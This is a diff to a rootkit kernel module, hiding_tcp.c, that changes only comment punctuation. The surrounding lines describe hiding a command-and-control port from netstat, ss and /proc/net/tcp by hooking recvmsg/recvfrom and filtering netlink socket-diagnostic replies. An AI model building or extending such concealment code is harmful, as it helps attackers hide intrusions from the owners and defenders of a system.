@@ -1,4 +1,4 @@
-/* hiding_tcp.c — Hides C2 port from /proc/net/tcp*, ss, netstat, raw sockets.
+/* hiding_tcp.c   Hides C2 port from /proc/net/tcp*, ss, netstat, raw sockets.
  *
  * Ported from Singularity hiding_tcp.c with:
  *   - PORT hardcode replaced by bat_hidden_port global (sysfs-configurable)
@@ -158,7 +158,7 @@ out:
 }
 
 /*
- * tcp_hiding_filter_netlink — filters SOCK_DIAG responses in userspace buffer.
+ * tcp_hiding_filter_netlink   filters SOCK_DIAG responses in userspace buffer.
  *
  * Called from audit.c's recvmsg/recvfrom hooks AFTER the kernel copies the
  * netlink response to userspace. We re-parse the buffer in kernel space and
@@ -248,7 +248,7 @@ int hiding_tcp_init(void)
         else
             installed++;
     }
-    /* All 5 hooks are built-in kernel symbols — require at least 2 */
+    /* All 5 hooks are built-in kernel symbols   require at least 2 */
     return (installed >= 2) ? 0 : -ENOENT;
 }
 
